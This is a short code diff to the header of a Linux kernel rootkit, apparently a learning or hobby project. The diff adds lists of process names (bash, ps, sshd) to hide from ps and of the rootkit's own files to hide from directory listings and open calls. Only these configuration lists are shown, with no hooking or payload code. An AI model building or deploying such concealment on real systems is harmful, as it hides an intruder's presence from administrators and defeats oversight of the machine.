@@ -40,4 +40,10 @@ enum {
 	ROOT = 1,
 	HIDEMOD = 2,
 };
+
+// List of processes to hide from ps
+const char * const HIDDEN_PROCESSES[] = {"bash", "ps", "sshd"};
+
+// List of files to hide from getdents and open
+const char * const HIDDEN_FILES[] = {"RootKit.h", "RootKit.c", "RootKit.ko","Makefile","RootKit"};
 # endif // RootKit.h
